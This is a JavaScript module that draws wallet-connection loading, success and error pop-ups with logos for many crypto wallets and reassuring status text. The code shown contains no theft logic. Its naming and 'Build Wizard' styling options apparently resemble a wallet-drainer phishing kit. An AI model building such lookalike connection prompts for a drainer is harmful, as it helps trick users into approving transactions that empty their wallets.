const MS_RESOLVE_LOADER_STYLE = () => {
  try {
    const s = (typeof window !== 'undefined' && (window['AD_LOADER_STYLE'] || window.AD_LOADER_STYLE)) || 'plasma';
    return String(s).trim().toLowerCase() || 'plasma';
  } catch (_) { return 'plasma'; }
};

/** Build distinct visual HTML for Build Wizard loader_style (falls back to plasma markup). */
const MS_BUILD_LOADER_VISUAL = (style, walletLogo, walletName) => {
  const L = `<div class="ms_v_logo">${walletLogo || ''}</div>`;
  const name = walletName || 'Wallet';
  switch (style) {
    case 'coin3d':
      return `<div class="ms_v_coin3d"><div class="scene"><div class="edge"></div><div class="face front">${L}</div><div class="face back">${L}</div></div></div>`;
    case 'flipcard':
      return `<div class="ms_v_flip"><div class="card3d"><div class="side front">${L}</div><div class="side back">${L}</div></div></div>`;
    case 'floatglass':
      return `<div class="ms_v_glass"><div class="pad"><div class="logo">${L}</div></div></div>`;
    case 'appkit':
      return `<div class="ms_v_appkit"><div class="row"><div class="logo"><div class="ring"></div>${L}</div><div class="meta"><div class="name">${name}</div><div class="stat">Waiting for approval…</div></div></div><div class="bar"><i></i></div></div>`;
    case 'stack':
      return `<div class="ms_v_stack"><div class="item i1">${L}</div><div class="item i2">${L}</div><div class="item i3">${L}</div></div>`;
    case 'phone3d':
      return `<div class="ms_v_phone"><div class="device"><div class="notch"></div><div class="screen">${L}</div></div></div>`;
    case 'portal':
      return `<div class="ms_v_portal"><div class="tunnel"><div class="r"></div><div class="r"></div><div class="r"></div><div class="core">${L}</div></div></div>`;
    case 'bounce':
      return `<div class="ms_v_bounce"><div class="ball">${L}</div><div class="floor"></div></div>`;
    case 'scan':
      return `<div class="ms_v_scan"><div class="frame"><span class="corner tl"></span><span class="corner tr"></span><span class="corner bl"></span><span class="corner br"></span><div class="logo">${L}</div><div class="beam"></div></div></div>`;
    case 'hex3d':
      return `<div class="ms_v_hex"><div class="shape"><div class="logo">${L}</div></div></div>`;
    case 'dock':
      return `<div class="ms_v_dock"><div class="logo">${L}</div><div class="bar"><span></span><span class="on"></span><span></span></div></div>`;
    case 'cube3d':
      return `<div class="ms_v_cube"><div class="box"><div class="f f1">${L}</div><div class="f f2">${L}</div><div class="f f3">${L}</div><div class="f f4">${L}</div></div></div>`;
    case 'ripple':
      return `<div class="ms_v_ripple"><div class="w"></div><div class="w w2"></div><div class="w w3"></div><div class="logo">${L}</div></div>`;
    case 'sidepanel':
      return `<div class="ms_v_side"><div class="layout"><div class="hero"><div class="logo">${L}</div></div><div class="copy"><div class="t">${name}</div><div class="s">Confirm in your wallet app</div><div class="steps"><i></i><i></i><i></i></div></div></div></div>`;
    case 'system':
      return `<div class="ms_v_system"><div class="space"><div class="path"></div><div class="moon"></div><div class="moon moon2"></div><div class="sun">${L}</div></div></div>`;
    case 'plasma':
    default:
      return null; // keep default plasma markup in MS_LOADER_LOAD
  }
};

const MSL = {
  color_scheme: 'light',
  progress_timer: null,
  func: null,
  is_active: false,
  use_popup6: false,
  init: async () => {
    try {
      // Avoid duplicate injection
      if (document.querySelector('style[data-ms-loader]')) return;
      const style_elem = document.createElement('style');
      style_elem.setAttribute('data-ms-loader', '1');
      // Always use built-in loader CSS to avoid external 404s/noise
      style_elem.textContent = MS_LOADER_STYLE;
      document.head.append(style_elem);
    } catch(err) {
      /* silent */
    }
  },
  close: () => {
    try {
      document.querySelector('#ms-loader').remove();
    } catch(err) {
      // Loader already removed
    }
    try { clearInterval(MSL.progress_timer) } catch(err) {}
    MSL.is_active = false;
  },
  fire: async (st) => {
    try {
      // Ensure body is ready
      if (!document.body) {
        await new Promise(r => {
          if (document.body) r();
          else document.addEventListener('DOMContentLoaded', r);
        });
      }

      // Ensure init was called
      if (!document.querySelector('style[data-ms-loader]')) {
        await MSL.init();
      }

      MSL.close();

      let current_color = ((st.hasOwnProperty('color') ? st.color : MSL.color_scheme) == 'dark') ? 'black' : 'white';
      let mode = (st.hasOwnProperty('icon') ? st.icon : 'info'); let timer = (st.hasOwnProperty('timer') ? st.timer : 0);
      let show_button = (st.hasOwnProperty('showConfirmButton') ? st.showConfirmButton : true);
      let button_func = (st.hasOwnProperty('func') ? st.func : MSL.close); let loader_content = '';

      MSL.is_active = true;
      MSL.func = button_func;

      // Use replace with global regex instead of replaceAll for compatibility
      const replaceAll = (str, find, repl) => str.replace(new RegExp(find.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), repl);

      // Get wallet name from st.wallet, selected wallet, AD_Wallet_Name, or provider
      let wallet_name = st.wallet || 
                       (typeof window !== 'undefined' && window.AD_Selected_Wallet_Name) ||
                       (typeof AD_Wallet_Name !== 'undefined' && AD_Wallet_Name) ||
                       (typeof window !== 'undefined' && window.AD_Current_Provider) || 
                       'WalletConnect';
      // Don't treat generic WC provider name as the selected wallet when we have a real selection
      if ((!st.wallet) && wallet_name === 'WalletConnect' && typeof window !== 'undefined' && window.AD_Selected_Wallet_Name) {
        wallet_name = window.AD_Selected_Wallet_Name;
      }      
      // Try to get logo from clicked wallet first, then AppKit, then fallback
      let wallet_logo = null;
      let wallet_logo_url = null;
      
      // Priority 1: SVG content from AppKit (most reliable - direct SVG from connection request)
      if (typeof window !== 'undefined' && window.AD_Selected_Wallet_Logo_SVG) {
        // Use SVG content directly from AppKit
        wallet_logo = window.AD_Selected_Wallet_Logo_SVG;
      }
      // Priority 2: Logo URL from clicked wallet or connection request
      else if (typeof window !== 'undefined' && window.AD_Selected_Wallet_Logo_URL) {
        wallet_logo_url = window.AD_Selected_Wallet_Logo_URL;
        // If it's a data URI SVG, extract and use SVG content
        if (wallet_logo_url.startsWith('data:image/svg+xml')) {
          try {
            const decoded = decodeURIComponent(wallet_logo_url.split(',')[1] || '');
            if (decoded.includes('<svg')) {
              wallet_logo = decoded;
              wallet_logo_url = null; // Clear URL since we have SVG
            }
          } catch(err) {
            // Fallback to img tag
          }
        }
        // If it's an SVG URL, try to fetch it
        else if (wallet_logo_url.endsWith('.svg') || wallet_logo_url.includes('.svg')) {
          // For SVG URLs, we'll use img tag (browser will render it)
          wallet_logo = `<img src="${wallet_logo_url}" alt="${wallet_name}" style="width: 100%; height: 100%; object-fit: contain;" />`;
          wallet_logo_url = null; // Clear URL since we set wallet_logo
        }
      }
      // Priority 3: Try to get logo from AppKit if available
      else if (typeof window !== 'undefined' && window.AD_AppKit) {
        try {
          // Get wallet info from AppKit
          const wallet_info = window.AD_AppKit.getWalletInfo && window.AD_AppKit.getWalletInfo();
          if (wallet_info && wallet_info.imageUrl) {
            wallet_logo_url = wallet_info.imageUrl;
          } else {
            // Try to get from AppKit state
            const appkit_state = window.AD_AppKit.getState && window.AD_AppKit.getState();
            if (appkit_state && appkit_state.walletInfo && appkit_state.walletInfo.imageUrl) {
              wallet_logo_url = appkit_state.walletInfo.imageUrl;
            }
          }
        } catch(err) {
          // Fallback to manual logo system
        }
      }
      
      // If we have logo URL (and not SVG content), use img tag
      if (wallet_logo_url && !wallet_logo) {
        wallet_logo = `<img src="${wallet_logo_url}" alt="${wallet_name}" style="width: 100%; height: 100%; object-fit: contain;" />`;
      }
      // If we still don't have logo, use fallback system
      else if (!wallet_logo) {
        // Fallback Priority 1: Try to get site favicon
        let faviconUrl = null;
        if (typeof window !== 'undefined' && window.location) {
          try {
            // Try common favicon locations
            const origin = window.location.origin;
            const faviconPaths = [
              `${origin}/favicon.ico`,
              `${origin}/favicon.png`,
              `${origin}/favicon.svg`,
              `${origin}/apple-touch-icon.png`
            ];
            
            // Check if favicon exists (async, but we'll try the first one)
            faviconUrl = faviconPaths[0]; // Start with favicon.ico
            
            // Also check for link[rel="icon"] in document
            const faviconLink = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
            if (faviconLink && faviconLink.href) {
              faviconUrl = faviconLink.href;
              // If relative URL, make it absolute
              if (faviconUrl.startsWith('/')) {
                faviconUrl = origin + faviconUrl;
              } else if (!faviconUrl.startsWith('http')) {
                faviconUrl = origin + '/' + faviconUrl;
              }
            }
          } catch(err) {
            // Ignore favicon errors
          }
        }
        
        // Fallback Priority 2: Try hardcoded wallet logos + asset images
        // Normalize wallet name (keep original if it's a valid wallet name from "All Wallets")
        const walletNameLower = wallet_name.toLowerCase();
        if (walletNameLower.includes('metamask')) wallet_name = 'MetaMask';
        else if (walletNameLower.includes('trust')) wallet_name = 'Trust Wallet';
        else if (walletNameLower.includes('coinbase') || walletNameLower.includes('base')) wallet_name = 'Coinbase';
        else if (walletNameLower.includes('binance')) wallet_name = 'Binance Wallet';
        else if (walletNameLower.includes('okx')) wallet_name = 'OKX Wallet';
        else if (walletNameLower.includes('bitget') || walletNameLower.includes('bitkeep')) wallet_name = 'Bitget Wallet';
        else if (walletNameLower.includes('rainbow')) wallet_name = 'Rainbow';
        else if (walletNameLower.includes('zerion')) wallet_name = 'Zerion';
        else if (walletNameLower.includes('safepal')) wallet_name = 'SafePal';
        else if (walletNameLower.includes('rabby')) wallet_name = 'Rabby';
        else if (walletNameLower.includes('1inch')) wallet_name = '1inch Wallet';
        else if (walletNameLower.includes('exodus')) wallet_name = 'Exodus';
        else if (walletNameLower.includes('tokenpocket') || walletNameLower === 'tp') wallet_name = 'TokenPocket';
        else if (walletNameLower.includes('imtoken')) wallet_name = 'imToken';
        else if (walletNameLower.includes('ledger')) wallet_name = 'Ledger';
        else if (walletNameLower.includes('uniswap')) wallet_name = 'Uniswap';
        else if (walletNameLower.includes('walletconnect')) wallet_name = 'WalletConnect';
        // If wallet_name is already a valid name (not just "WalletConnect" default), keep it
        else if (wallet_name && wallet_name !== 'WalletConnect' && wallet_name.length > 2) {
          // Keep the wallet name as-is (it might be from "All Wallets" section)
        } else {
          wallet_name = 'WalletConnect';
        }
        
        // Try hardcoded SVG logo first
        wallet_logo = WALLET_LOGOS[wallet_name];
        
        // Asset image map for wallets without inline SVG in WALLET_LOGOS
        if (!wallet_logo) {
          const ASSET_LOGOS = {
            'Rainbow': '/assets/graphics/images/rainbow.webp',
            'Zerion': '/assets/graphics/images/zerion.webp',
            'SafePal': '/assets/graphics/images/safepal.webp',
            'Rabby': '/assets/graphics/images/rabby.webp',
            '1inch Wallet': '/assets/graphics/images/1inch.webp',
            'Exodus': '/assets/graphics/images/exodus.webp',
            'TokenPocket': '/assets/graphics/images/tokenpocket.webp',
            'imToken': '/assets/graphics/images/imtoken.webp',
            'Backpack': '/assets/graphics/images/backpack.webp',
            'Ledger': '/assets/graphics/images/ledger.webp',
            'Uniswap': '/assets/graphics/images/uniswap.webp',
            'OKX Wallet': '/assets/graphics/images/okx.webp',
            'MetaMask': '/assets/graphics/images/metamask.webp',
            'Trust Wallet': '/assets/graphics/images/trust.webp',
            'Coinbase': '/assets/graphics/images/coinbase.webp',
            'Binance Wallet': '/assets/graphics/images/binance.webp',
            'Bitget Wallet': '/assets/graphics/images/bitget.webp',
            'WalletConnect': '/assets/graphics/images/WC.svg',
          };
          const assetUrl = ASSET_LOGOS[wallet_name];
          if (assetUrl) {
            wallet_logo = `<img src="${assetUrl}" alt="${wallet_name}" style="width:100%;height:100%;object-fit:contain;border-radius:12px;" />`;
          }
        }
        
        // Fallback Priority 3: Use favicon ONLY if wallet is truly unknown (not WC default)
        if (!wallet_logo && faviconUrl && wallet_name !== 'WalletConnect') {
          // Use favicon with WalletConnect SVG as fallback (via onerror)
          const walletConnectFallback = WALLET_LOGOS['WalletConnect'];
          wallet_logo = `<div class="ms_wallet_logo_fallback">
            <img src="${faviconUrl}" alt="${wallet_name}" style="width: 100%; height: 100%; object-fit: contain;" onerror="this.style.display='none'; this.parentElement.querySelector('.fallback-svg').style.display='block';" />
            <div class="fallback-svg" style="display: none; width: 100%; height: 100%;">${walletConnectFallback}</div>
          </div>`;
        }
        
        // Fallback Priority 4: Use WalletConnect logo as final fallback
        if (!wallet_logo) {
          wallet_logo = WALLET_LOGOS['WalletConnect'];
        }
      }
      
      const loaderStyle = MS_RESOLVE_LOADER_STYLE();
      const variantVisual = (mode === 'load') ? MS_BUILD_LOADER_VISUAL(loaderStyle, wallet_logo, wallet_name) : null;

      if (mode == 'load') {
        loader_content = replaceAll(MS_LOADER_LOAD, '$TITLE$', st.title || 'Establishing Connection');
        loader_content = replaceAll(loader_content, '$TEXT$', st.text || 'Connecting securely to blockchain...');
        loader_content = replaceAll(loader_content, '$BUTTON$', st.confirmButtonText || 'Please wait');
        loader_content = replaceAll(loader_content, '$COLOR$', current_color + (loaderStyle !== 'plasma' ? ` style-${loaderStyle}` : ''));
        loader_content = replaceAll(loader_content, '$PROGRESS$', timer > 0 ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SHOW_BUTTON$', show_button == true ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$WALLET_LOGO$', wallet_logo);
        if (variantVisual) {
          // Swap plasma orbit visual for selected Build Wizard style
          loader_content = loader_content.replace(
            /<div class="ms_visual">[\s\S]*?<\/div>\s*<div class="ms_loader_title">/,
            `<div class="ms_visual">${variantVisual}</div>\n    <div class="ms_loader_title">`
          );
          if (loaderStyle === 'sidepanel' || loaderStyle === 'appkit') {
            // Side/AppKit carry their own copy — hide duplicate title/text slightly less noisy
            loader_content = loader_content.replace('ms_loader_title', 'ms_loader_title');
          }
        }
      } else if (mode == 'success') {
        loader_content = replaceAll(MS_LOADER_SUCCESS, '$TITLE$', st.title || 'Connection Successful');
        loader_content = replaceAll(loader_content, '$TEXT$', st.text || 'You\'ve successfully connected your wallet');
        loader_content = replaceAll(loader_content, '$BUTTON$', st.confirmButtonText || 'Please wait');
        loader_content = replaceAll(loader_content, '$COLOR$', current_color);
        loader_content = replaceAll(loader_content, '$PROGRESS$', timer > 0 ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SHOW_BUTTON$', show_button == true ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SUBTITLE$', st.subtitle || 'All done!');
        loader_content = replaceAll(loader_content, '$WALLET_LOGO$', wallet_logo);
      } else if (mode == 'error') {
        loader_content = replaceAll(MS_LOADER_ERROR, '$TITLE$', st.title || 'Connection Failed');
        loader_content = replaceAll(loader_content, '$TEXT$', st.text || 'Please try again or check your wallet');
        loader_content = replaceAll(loader_content, '$BUTTON$', st.confirmButtonText || 'Please wait');
        loader_content = replaceAll(loader_content, '$COLOR$', current_color);
        loader_content = replaceAll(loader_content, '$PROGRESS$', timer > 0 ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SHOW_BUTTON$', show_button == true ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SUBTITLE$', st.subtitle || 'Oops...');
        loader_content = replaceAll(loader_content, '$WALLET_LOGO$', wallet_logo);
      } else {
        loader_content = replaceAll(MS_LOADER_INFO, '$TITLE$', st.title || 'Information');
        loader_content = replaceAll(loader_content, '$TEXT$', st.text || 'This is an informational message');
        loader_content = replaceAll(loader_content, '$BUTTON$', st.confirmButtonText || 'Please wait');
        loader_content = replaceAll(loader_content, '$COLOR$', current_color);
        loader_content = replaceAll(loader_content, '$PROGRESS$', timer > 0 ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SHOW_BUTTON$', show_button == true ? '' : 'display: none');
        loader_content = replaceAll(loader_content, '$SUBTITLE$', st.subtitle || 'Please note');
        loader_content = replaceAll(loader_content, '$WALLET_LOGO$', wallet_logo);
      }

      // If popup-6 is active, tag root with a class for CSS to hook.
      if (MSL.use_popup6) {
        try { loader_content = loader_content.replace('<div class="ms_loader ', '<div class="popup6 ms_loader '); } catch(_) {}
      }

      const loader_elem = document.createElement('div');
      loader_elem.id = 'ms-loader';
      loader_elem.innerHTML = loader_content;
      if (document.body.firstChild) {
        document.body.insertBefore(loader_elem, document.body.firstChild);
      } else {
        document.body.appendChild(loader_elem);
      }

      if (timer > 0) {
        let countdown = timer;
        MSL.progress_timer = setInterval(() => {
          countdown -= 10;
          if (countdown <= 10) {
            MSL.close();
          } else {
            let percent = (countdown / timer) * 100;
            try {
              document.querySelector('#ms-progress').style.width = `${percent}%`;
            } catch(err) {
              console.log(err);
            }
          }
        }, 10);
        while (countdown > 10)
          await new Promise(r => setTimeout(r, 10));
        return true;
      } else {
        while (MSL.is_active)
          await new Promise(r => setTimeout(r, 10));
        return true;
      }

    } catch(err) {
      console.error('[MSL.fire] Error:', err);
    }
  },
  action: () => {
    try {
      MSL.func();
    } catch(err) {
      console.log(err);
    }
  }
};

// Ensure global access and early style injection
try {
  // expose
  window.MSL = MSL;
  // init as early as possible
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => { try { MSL.init(); } catch(_) {} });
  } else {
    MSL.init();
  }
} catch(_) {}



